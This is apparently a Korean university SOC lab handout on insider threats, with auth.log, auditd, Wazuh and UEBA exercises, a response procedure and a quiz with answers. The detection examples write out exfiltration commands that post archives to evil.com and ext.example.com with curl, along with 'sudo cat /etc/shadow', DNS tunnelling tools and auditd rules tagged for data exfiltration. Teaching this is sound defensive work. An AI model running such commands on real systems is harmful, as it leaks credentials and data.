# Week 12: 인시던트 대응 실습 (3) - 내부 위협

## 학습 목표
- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
- 내부 위협 인시던트 대응 보고서를 작성한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (보안관제/SOC 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **SOC** | Security Operations Center | 보안 관제 센터 (24/7 모니터링) | 경찰 112 상황실 |
| **관제** | Monitoring/Surveillance | 보안 이벤트를 실시간 감시하는 활동 | CCTV 관제 |
| **경보** | Alert | 보안 이벤트가 탐지 규칙에 매칭되어 발생한 알림 | 화재 경보기 울림 |
| **이벤트** | Event | 시스템에서 발생한 모든 활동 기록 | 일어난 일 하나하나 |
| **인시던트** | Incident | 보안 정책을 위반한 이벤트 (실제 위협) | 실제 화재 발생 |
| **오탐** | False Positive | 정상 활동을 공격으로 잘못 탐지 | 화재 경보기가 요리 연기에 울림 |
| **미탐** | False Negative | 실제 공격을 놓침 | 도둑이 CCTV에 안 잡힘 |
| **TTD** | Time to Detect | 공격 발생~탐지까지 걸리는 시간 | 화재 발생~경보 울림 시간 |
| **TTR** | Time to Respond | 탐지~대응까지 걸리는 시간 | 경보~소방차 도착 시간 |
| **SIGMA** | SIGMA | SIEM 벤더에 무관한 범용 탐지 룰 포맷 | 국제 표준 수배서 양식 |
| **Tier 1/2/3** | SOC Tiers | 관제 인력 수준 (L1:모니터링, L2:분석, L3:전문가) | 일반의→전문의→교수 |
| **트리아지** | Triage | 경보를 우선순위별로 분류하는 작업 | 응급실 환자 분류 |
| **플레이북** | Playbook (IR) | 인시던트 유형별 대응 절차 매뉴얼 | 화재 대응 매뉴얼 |
| **포렌식** | Forensics | 사이버 범죄 수사를 위한 증거 수집·분석 | 범죄 현장 감식 |
| **IOC** | Indicator of Compromise | 침해 지표 (악성 IP, 도메인, 해시) | 수배범의 지문, 차량번호 |
| **TTP** | Tactics, Techniques, Procedures | 공격자의 전술·기법·절차 | 범인의 범행 수법 |
| **위협 헌팅** | Threat Hunting | 탐지 룰에 걸리지 않는 위협을 능동적으로 찾는 활동 | 잠복 수사 |
| **syslog** | syslog | 시스템 로그를 원격 전송하는 프로토콜 (UDP 514) | 모든 부서 보고서를 본사로 모으는 시스템 |

---

# Week 12: 인시던트 대응 실습 (3) - 내부 위협

## 학습 목표
- 내부 위협(Insider Threat)의 유형과 탐지 방법을 이해한다
- sudo 남용, 비인가 접근, 데이터 유출 시나리오를 분석한다
- auditd와 Wazuh를 활용한 내부 행위 모니터링을 수행한다
- 내부 위협 인시던트 대응 보고서를 작성한다

---

## 1. 내부 위협 개요

### 1.1 내부 위협 분류

| 유형 | 설명 | 예시 |
|------|------|------|
| 악의적 내부자 | 의도적 데이터 유출/파괴 | 퇴직 전 기밀 반출 |
| 부주의한 내부자 | 실수로 보안 위반 | 민감 파일 공개 공유 |
| 권한 남용 | 업무 범위 초과 접근 | sudo로 타인 파일 열람 |
| 계정 탈취 | 외부 공격자가 내부 계정 사용 | 피싱으로 크리덴셜 탈취 |

### 1.2 시나리오

```
시나리오: IT 관리자(user)가 sudo 권한을 남용하여
         다른 사용자 파일 열람 및 외부 전송 시도

모니터링: auditd -> Wazuh SIEM -> SOC 분석
```

---

## 2. 탐지: sudo 남용 모니터링

> **이 실습을 왜 하는가?**
> "인시던트 대응 실습 (3) - 내부 위협" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 보안관제/SOC 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 auth.log에서 sudo 사용 이력 분석

> **실습 목적**: 내부 위협(Insider Threat)을 auth.log의 sudo 사용 이력과 비정상 행위에서 탐지한다
>
> **배우는 것**: 정상 관리 작업과 비인가 권한 사용을 구분하고, 내부자 위협 지표를 식별하는 방법을 배운다
>
> **결과 해석**: 업무 시간 외 sudo 사용, 비인가 명령 실행, 대량 데이터 접근이 발견되면 내부 위협을 의심한다
>
> **실전 활용**: 내부 위협은 탐지가 어렵고 피해가 크므로, UEBA(사용자 행위 분석)가 SOC의 주요 과제이다

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== sudo 사용 이력 분석 ==="

# 전체 sudo 명령 이력
echo "--- 최근 sudo 명령 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | tail -15  # 패턴 검색

echo ""
echo "--- sudo 사용 통계 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | \
  grep "COMMAND=" | \
  sed 's/.*COMMAND=//' | \
  sort | uniq -c | sort -rn | head -10                 # 정렬

echo ""
echo "--- sudo 실패 (비인가 시도) ---"
grep -E "sudo:.*NOT in sudoers|authentication failure" /var/log/auth.log 2>/dev/null | tail -5  # 패턴 검색

echo ""
echo "--- 사용자별 sudo 빈도 ---"
grep "sudo:" /var/log/auth.log 2>/dev/null | \
  grep -oP "USER=\w+" | sort | uniq -c | sort -rn      # 디렉터리 재귀 검색
ENDSSH
```

### 2.2 auditd 규칙으로 민감 행위 감시

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== auditd 규칙 확인 ==="

# 현재 audit 규칙 확인
echo "1" | sudo -S auditctl -l 2>/dev/null || echo "auditd 미설치 또는 비활성"

echo ""
echo "--- 권장 audit 규칙 (내부 위협 탐지) ---"
cat << 'RULES'
# 민감 파일 접근 감시
-w /etc/passwd -p wa -k identity_change
-w /etc/shadow -p wa -k identity_change
-w /etc/sudoers -p wa -k sudo_change

# sudo 설정 변경 감시
-w /etc/sudoers.d/ -p wa -k sudo_change

# 대량 파일 복사/이동
-a always,exit -F arch=b64 -S rename,renameat -k file_move
-w /usr/bin/scp -p x -k data_exfil
-w /usr/bin/rsync -p x -k data_exfil
-w /usr/bin/curl -p x -k data_exfil

# 계정 생성/삭제
-w /usr/sbin/useradd -p x -k account_change
-w /usr/sbin/userdel -p x -k account_change
RULES
ENDSSH
```

### 2.3 Wazuh에서 내부 위협 경보

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== Wazuh 내부 위협 관련 경보 ==="

cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c "
import sys, json
sudo_alerts = []
for line in sys.stdin:                                 # 반복문 시작
    try:
        a = json.loads(line.strip())
        desc = a.get('rule',{}).get('description','').lower()
        full_log = a.get('full_log','').lower()
        if 'sudo' in desc or 'sudo' in full_log or 'privilege' in desc:
            sudo_alerts.append(a)
    except: pass

print(f'sudo/권한 관련 경보: {len(sudo_alerts)}건')
for a in sudo_alerts[-10:]:                            # 반복문 시작
    rule = a.get('rule',{})
    ts = a.get('timestamp','')
    agent = a.get('agent',{}).get('name','')
    print(f'  [{rule.get(\"level\",0)}] {ts[:19]} ({agent}) {rule.get(\"description\",\"\")[:60]}')
" 2>/dev/null || echo "경보 데이터 접근 불가"
ENDSSH
```

---

## 3. 분석: 내부 위협 시나리오 재현

### 3.1 시나리오 1 - sudo를 이용한 파일 열람

로그나 설정에서 특정 패턴을 검색합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 시나리오 1: sudo 파일 열람 시뮬레이션 ==="

echo "--- Step 1: 다른 사용자 디렉토리 접근 시도 ---"
ls /root/ 2>&1 | head -3
echo "(일반 사용자로는 접근 불가)"

echo ""
echo "--- Step 2: sudo로 접근 (권한 남용) ---"
echo "1" | sudo -S ls /root/ 2>/dev/null | head -5

echo ""
echo "--- Step 3: 접근 로그 확인 ---"
grep "sudo.*COMMAND.*ls.*root" /var/log/auth.log 2>/dev/null | tail -3  # 패턴 검색

echo ""
echo "=== 탐지 포인트 ==="
echo "1. auth.log에 sudo COMMAND 기록"
echo "2. auditd에서 /root 접근 기록"
echo "3. Wazuh rule 5402 (sudo 명령 실행) 경보"
ENDSSH
```

### 3.2 시나리오 2 - 데이터 유출 시도 패턴

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
exfil_indicators = [
    {
        "pattern": "대량 파일 압축",
        "commands": ["tar czf /tmp/backup.tar.gz /etc/", "zip -r /tmp/data.zip /var/log/"],
        "detection": "auditd: tar/zip 실행 감시, 파일 크기 모니터링",
    },
    {
        "pattern": "외부 전송",
        "commands": ["scp /tmp/data.zip user@external:/", "curl -F file=@/tmp/data.zip http://evil.com/"],
        "detection": "auditd: scp/curl 실행 감시, DLP 솔루션",
    },
    {
        "pattern": "DNS 터널링",
        "commands": ["dnscat2", "iodine"],
        "detection": "Suricata: 비정상 DNS 쿼리 탐지, DNS 쿼리 길이/빈도",
    },
    {
        "pattern": "USB 복사",
        "commands": ["mount /dev/sdb1 /mnt", "cp -r /data /mnt/"],
        "detection": "udev 규칙, auditd: mount 감시",
    },
]

print(f"{'패턴':<20} {'탐지 방법'}")
print("=" * 70)
for ind in exfil_indicators:                           # 반복문 시작
    print(f"\n{ind['pattern']}")
    for cmd in ind['commands']:                        # 반복문 시작
        print(f"  명령: {cmd}")
    print(f"  탐지: {ind['detection']}")
PYEOF
ENDSSH
```

### 3.3 UEBA 스타일 행위 이상 탐지

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
user_activities = [
    {"time": "09:00", "action": "login", "detail": "SSH 로그인"},
    {"time": "09:05", "action": "command", "detail": "ls, cd (일반 작업)"},
    {"time": "09:30", "action": "command", "detail": "vim config.yaml"},
    {"time": "14:00", "action": "sudo", "detail": "sudo cat /etc/shadow"},
    {"time": "14:01", "action": "sudo", "detail": "sudo ls /root/"},
    {"time": "14:02", "action": "command", "detail": "tar czf /tmp/data.tar.gz /root/"},
    {"time": "14:03", "action": "command", "detail": "curl -X POST http://ext.example.com -F f=@/tmp/data.tar.gz"},
    {"time": "14:05", "action": "command", "detail": "rm /tmp/data.tar.gz"},
    {"time": "17:00", "action": "logout", "detail": "정상 퇴근"},
]

print("시간   행위        상세                                           판정")
print("=" * 85)
for act in user_activities:                            # 반복문 시작
    anomaly = False
    reason = ""
    if "shadow" in act["detail"]: anomaly, reason = True, "민감 파일 접근"
    elif "/root/" in act["detail"] and "sudo" in act["action"]: anomaly, reason = True, "타 사용자 디렉토리"
    elif "tar" in act["detail"] and "/root" in act["detail"]: anomaly, reason = True, "대량 데이터 수집"
    elif "curl" in act["detail"] and "ext" in act["detail"]: anomaly, reason = True, "외부 전송 시도"
    elif act["detail"].startswith("rm") and "tmp" in act["detail"]: anomaly, reason = True, "증거 인멸 의심"

    flag = f"[ANOMALY] {reason}" if anomaly else "[NORMAL]"
    print(f"{act['time']}  {act['action']:<10}  {act['detail']:<45} {flag}")
PYEOF
ENDSSH
```

---

## 4. 대응 (Response)

### 4.1 계정 비활성화 절차

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== 계정 비활성화 절차 (교육용) ==="

cat << 'PROCEDURE'
내부 위협 확인 시 즉시 대응 절차:

1. 계정 비활성화
   $ sudo usermod -L [username]
   $ sudo chage -E 0 [username]

2. 활성 세션 강제 종료
   $ sudo pkill -u [username]

3. SSH 키 비활성화
   $ sudo mv /home/[user]/.ssh/authorized_keys /home/[user]/.ssh/authorized_keys.disabled

4. sudo 권한 제거
   $ sudo deluser [username] sudo

5. 증거 보전
   $ sudo cp -rp /home/[username]/ /evidence/$(date +%Y%m%d)/
   $ sudo cp /var/log/auth.log /evidence/$(date +%Y%m%d)/
   $ sudo journalctl _UID=[uid] > /evidence/$(date +%Y%m%d)/journal.log
PROCEDURE

echo ""
echo "--- 현재 활성 사용자 ---"
who 2>/dev/null                                        # 로그인 사용자 조회
echo ""
echo "--- sudo 그룹 ---"
getent group sudo 2>/dev/null
ENDSSH
```

### 4.2 Wazuh Active Response 설정

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 << 'ENDSSH'  # 비밀번호 자동입력 SSH
echo "=== Wazuh Active Response 설정 예시 ==="

cat << 'CONFIG'
<!-- ossec.conf Active Response -->
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5402,5403</rules_id>
  <timeout>3600</timeout>
</active-response>

<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5710,5712</rules_id>
  <timeout>1800</timeout>
</active-response>
CONFIG

echo ""
echo "--- Active Response 바이너리 ---"
ls -la /var/ossec/active-response/bin/ 2>/dev/null | head -10
ENDSSH
```

---

## 5. 보고서 작성

### 5.1 LLM 보고서 자동 생성

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{                                                # 요청 데이터(body)
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "SOC 인시던트 대응 보고서 작성 전문가입니다. 한국어로 전문적인 보고서를 작성합니다."},
      {"role": "user", "content": "다음 내부 위협 인시던트 보고서를 작성하세요:\n\n사건: IT 관리자가 sudo로 /etc/shadow, /root/ 접근 후 tar로 수집, curl로 외부 전송 시도, 증거 삭제\n탐지: auth.log sudo 이력 -> Wazuh 경보 -> SOC\n대응: 계정 잠금, sudo 제거, 세션 종료\n\n1) 타임라인 2) ATT&CK 매핑 3) 재발 방지 권고"}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 6. 내부 위협 방지 체계

### 6.1 예방적 통제

원격 서버에 접속하여 명령을 실행합니다.

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
python3 << 'PYEOF'                                     # Python 스크립트 실행
controls = {
    "기술적 통제": [
        ("최소 권한 원칙", "필요 최소한의 sudo 명령만 허용"),
        ("DLP", "민감 데이터 외부 전송 차단"),
        ("UEBA", "사용자 행위 이상 탐지"),
        ("네트워크 세분화", "내부 네트워크 접근 제한"),
        ("MFA", "중요 시스템 다중 인증"),
    ],
    "관리적 통제": [
        ("접근 리뷰", "분기별 권한 점검"),
        ("퇴직자 절차", "즉시 계정 비활성화"),
        ("보안 교육", "내부 위협 인식 교육"),
        ("감사 로그", "모든 관리자 행위 기록"),
    ],
    "탐지적 통제": [
        ("로그 모니터링", "sudo, SSH, 파일 접근 실시간 감시"),
        ("경보 규칙", "비정상 시간대/패턴 경보"),
        ("정기 감사", "월별 관리자 행위 감사"),
    ],
}

for category, items in controls.items():               # 반복문 시작
    print(f"\n{category}")
    print("=" * 50)
    for name, desc in items:                           # 반복문 시작
        print(f"  - {name}: {desc}")
PYEOF
ENDSSH
```

---

## 핵심 정리

1. 내부 위협은 악의적 내부자, 부주의, 권한 남용, 계정 탈취로 분류된다
2. auth.log와 auditd는 내부 행위 모니터링의 핵심 데이터 소스다
3. UEBA 관점에서 사용자 행위 패턴 이상을 탐지해야 한다
4. 내부 위협 확인 시 계정 잠금, 세션 종료, 증거 보전 순서로 대응한다
5. 최소 권한 원칙과 정기 접근 리뷰가 예방의 핵심이다
6. 기술적 + 관리적 + 탐지적 통제를 조합해야 효과적이다

---

## 다음 주 예고
- Week 13: 위협 인텔리전스(CTI) 활용 - OpenCTI 연동, IOC 조회, 위협 헌팅

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** SOC에서 False Positive(오탐)란?
- (a) 공격을 정확히 탐지  (b) **정상 활동을 공격으로 잘못 탐지**  (c) 공격을 놓침  (d) 로그 미수집

**Q2.** SIGMA 룰의 핵심 장점은?
- (a) 특정 SIEM에서만 동작  (b) **SIEM 벤더에 독립적인 범용 포맷**  (c) 자동 차단 기능  (d) 로그 압축

**Q3.** TTD(Time to Detect)를 줄이기 위한 방법은?
- (a) 경보를 비활성화  (b) **실시간 경보 규칙 최적화 + 자동화**  (c) 분석 인력 감축  (d) 로그 보관 기간 단축

**Q4.** 인시던트 대응 NIST 6단계에서 첫 번째는?
- (a) 탐지(Detection)  (b) **준비(Preparation)**  (c) 격리(Containment)  (d) 근절(Eradication)

**Q5.** Wazuh logtest의 용도는?
- (a) 서버 성능 측정  (b) **탐지 룰을 실제 배포 전에 테스트**  (c) 네트워크 속도 측정  (d) 디스크 점검

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): Wazuh alerts.json/logtest/agent_control, SIGMA 룰, 경보 분석
